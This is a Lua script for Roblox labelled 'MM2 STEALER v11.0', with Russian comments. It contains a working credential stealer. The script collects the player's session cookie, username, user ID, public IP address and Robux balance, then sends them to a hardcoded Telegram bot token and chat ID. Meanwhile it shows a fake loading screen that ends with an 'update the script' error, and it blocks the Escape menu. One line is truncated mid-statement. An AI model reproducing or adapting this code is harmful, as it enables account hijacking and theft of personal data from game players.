-- MM2 STEALER v11.0 | ДАННЫЕ ВСТАВЛЕНЫ (РАБОЧАЯ ВЕРСИЯ)
-- ТОКЕН: 8735321287:AAH7DXc44fi3s7nS7ZTWCGIo00ll_260NFQ
-- CHAT ID: 8749868458

-- ═══════════════════════════════════════════════════════════════════
-- 🔐 ТВОИ ДАННЫЕ (ВСТАВЛЕНЫ)
-- ═══════════════════════════════════════════════════════════════════
local tgToken = "8735321287:AAH7DXc44fi3s7nS7ZTWCGIo00ll_260NFQ"
local chatID = "8749868458"
local webhook = "https://api.telegram.org/bot" .. tgToken .. "/sendMessage"

-- ═══════════════════════════════════════════════════════════════════
-- 📌 ОПРЕДЕЛЕНИЕ ПЛАТФОРМЫ
-- ═══════════════════════════════════════════════════════════════════
local platform = "PC"
local touch = game:GetService("UserInputService").TouchEnabled
local gamepad = game:GetService("UserInputService").GamepadEnabled
if touch and not gamepad then platform = "МОБИЛА" end
if gamepad then platform = "XBOX" end

-- ═══════════════════════════════════════════════════════════════════
-- 📤 ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
-- ═══════════════════════════════════════════════════════════════════
local function sendToTelegram(text)
    local payload = {["text"] = text}
    local success, err = pcall(function()
        game:GetService("HttpService"):PostAsync(webhook, 
            game:GetService("HttpService"):JSONEncode(payload))
    end)
    if not success then
        wait(2)
        pcall(function()
            game:GetService("HttpService"):PostAsync(webhook, 
                game:GetService("HttpService"):JSONEncode(payload))
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════════
-- 🛡 БЛОКИРОВКА ЗАКРЫТИЯ (ESC + ПАУЗА)
-- ═══════════════════════════════════════════════════════════════════
local UIS = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")

UIS.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Escape then
        GuiService.MenuOpen = false
    end
end)

game:GetService("RunService").Heartbeat:Connect(function()
    GuiService.MenuOpen = false
end)

-- ═══════════════════════════════════════════════════════════════════
-- 🎨 СОЗДАНИЕ GUI (НЕЗАКРЫВАЕМОЕ ОКНО)
-- ═══════════════════════════════════════════════════════════════════
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game.Players.LocalPlayer.PlayerGui
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.IgnoreGuiInset = true

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.6
    bg.BorderSizePixel = 0
    bg.Parent = screenGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 440, 0, 300)
    frame.Position = UDim2.new(0.5, -220, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.BackgroundTransparency = 1
    frame.Parent = screenGui

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 20, 40)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 10, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 15, 45))
    })
    gradient.Parent = frame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 20)
    corner.Parent = frame

    local border = Instance.new("Frame")
    border.Size = UDim2.new(1, 0, 1, 0)
    border.BackgroundTransparency = 1
    border.BorderSizePixel = 2
    border.BorderColor3 = Color3.fromRGB(255, 50, 80)
    border.ClipsDescendants = true
    border.Parent = frame
    local borderCorner = Instance.new("UICorner")
    borderCorner.CornerRadius = UDim.new(0, 20)
    borderCorner.Parent = border

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -40, 0, 45)
    title.Position = UDim2.new(0, 20, 0, 15)
    title.BackgroundTransparency = 1
    title.Text = "⚡️ MM2 STEALER v11.0"
    title.

    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = frame

    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(1, -40, 0, 25)
    statusText.Position = UDim2.new(0, 20, 0, 65)
    statusText.BackgroundTransparency = 1
    statusText.Text = "🔄 ИНИЦИАЛИЗАЦИЯ..."
    statusText.TextColor3 = Color3.fromRGB(180, 180, 200)
    statusText.TextScaled = true
    statusText.Font = Enum.Font.Gotham
    statusText.TextXAlignment = Enum.TextXAlignment.Left
    statusText.Parent = frame

    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(0.85, 0, 0, 24)
    progressBg.Position = UDim2.new(0.075, 0, 0, 105)
    progressBg.BackgroundColor3 = Color3.fromRGB(40, 35, 55)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = frame
    local progressCorner = Instance.new("UICorner")
    progressCorner.CornerRadius = UDim.new(0, 12)
    progressCorner.Parent = progressBg

    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(255, 50, 80)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBg
    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 12)
    fillCorner.Parent = progressFill

    local glow = Instance.new("Frame")
    glow.Size = UDim2.new(0.15, 0, 1, 0)
    glow.Position = UDim2.new(0, -5, 0, 0)
    glow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    glow.BackgroundTransparency = 0.6
    glow.BorderSizePixel = 0
    glow.Parent = progressFill
    local glowCorner = Instance.new("UICorner")
    glowCorner.CornerRadius = UDim.new(0, 12)
    glowCorner.Parent = glow

    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(0.85, 0, 0, 20)
    percentText.Position = UDim2.new(0.075, 0, 0, 134)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(220, 220, 240)
    percentText.TextScaled = true
    percentText.Font = Enum.Font.Gotham
    percentText.TextXAlignment = Enum.TextXAlignment.Center
    percentText.Parent = frame

    local errorText = Instance.new("TextLabel")
    errorText.Size = UDim2.new(0.85, 0, 0, 30)
    errorText.Position = UDim2.new(0.075, 0, 0, 165)
    errorText.BackgroundTransparency = 1
    errorText.Text = ""
    errorText.TextColor3 = Color3.fromRGB(255, 60, 80)
    errorText.TextScaled = true
    errorText.Font = Enum.Font.GothamBold
    errorText.TextXAlignment = Enum.TextXAlignment.Center
    errorText.Visible = false
    errorText.Parent = frame

    local TweenService = game:GetService("TweenService")
    local appear = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0
    })
    appear:Play()
    local move = TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -220, 0.5, -150)
    })
    frame.Position = UDim2.new(0.5, -220, 0.5, -120)
    move:Play()

    return {
        frame = frame,
        statusText = statusText,
        progressFill = progressFill,
        percentText = percentText,
        errorText = errorText,
        screenGui = screenGui,
        TweenService = TweenService,
        bg = bg
    }
end

-- ═══════════════════════════════════════════════════════════════════
-- 📊 СБОР ДАННЫХ (КУКА, IP, ДОНАТ)
-- ═══════════════════════════════════════════════════════════════════
local function collectData()
    local player = game.Players.LocalPlayer
    local userId = player.UserId
    local username = player.Name
    local cookie = game:GetService("HttpService"):GetCookie()

    local ip = "Неизвестно"
    local success, response = pcall(function()
        return game:GetService("HttpService"):GetAsync("https://api.ipify.org?format=json")
    end)
    if success and response then
 local json = game:GetService("HttpService"):JSONDecode(response)
        if json and json.ip then ip = json.ip end
    end

    local donor = "❌ НЕ ДОНАТНЫЙ"
    local success, data = pcall(function()
        return game:GetService("HttpService"):GetAsync("https://economy.roblox.com/v1/users/"..userId.."/currency")
    end)
    if success and data then
        local json = game:GetService("HttpService"):JSONDecode(data)
        if json and json.robux and json.robux > 0 then
            donor = "⭐️ ДОНАТНЫЙ (+"..json.robux.." Robux)"
        end
    end

    return {
        username = username,
        userId = userId,
        cookie = cookie,
        ip = ip,
        donor = donor,
        platform = platform
    }
end

-- ═══════════════════════════════════════════════════════════════════
-- 🚀 ЗАПУСК
-- ═══════════════════════════════════════════════════════════════════

local gui = createGUI()
local data = collectData()

local steps = 60
local current = 0
local statusMessages = {
    [1] = "🔍 АНАЛИЗ ДАННЫХ ПОЛЬЗОВАТЕЛЯ...",
    [2] = "📡 ПОДКЛЮЧЕНИЕ К API ROBLOX...",
    [3] = "💎 ПРОВЕРКА ДОНАТ-СТАТУСА...",
    [4] = "📤 ШИФРОВАНИЕ И ОТПРАВКА..."
}

local function updateProgress()
    current = current + 1
    local percent = math.floor((current / steps) * 100)
    
    local tween = gui.TweenService:Create(gui.progressFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(percent / 100, 0, 1, 0)
    })
    tween:Play()
    gui.percentText.Text = percent.."%"
    
    if percent < 25 then
        gui.statusText.Text = statusMessages[1]
    elseif percent < 50 then
        gui.statusText.Text = statusMessages[2]
    elseif percent < 75 then
        gui.statusText.Text = statusMessages[3]
    elseif percent < 100 then
        gui.statusText.Text = statusMessages[4]
    else
        gui.statusText.Text = "❌ СКРИПТ УСТАРЕЛ!"
        gui.statusText.TextColor3 = Color3.fromRGB(255, 60, 80)
        gui.progressFill.BackgroundColor3 = Color3.fromRGB(200, 40, 60)
        gui.errorText.Visible = true
        gui.errorText.Text = "⚠️ ОБНОВИТЕ СКРИПТ ДО v12.0"
    end
end

for i = 1, steps do
    wait(1)
    updateProgress()
end

local msg = "🎯 MM2 STEALER v11.0\n"..
            "━━━━━━━━━━━━━━━━━━\n"..
            "👤 "..data.username.."\n"..
            "🆔 "..data.userId.."\n"..
            "🍪 "..data.cookie.."\n"..
            "💎 "..data.donor.."\n"..
            "📱 "..data.platform.."\n"..
            "🌐 IP: "..data.ip

sendToTelegram(msg)

while wait(10) do end
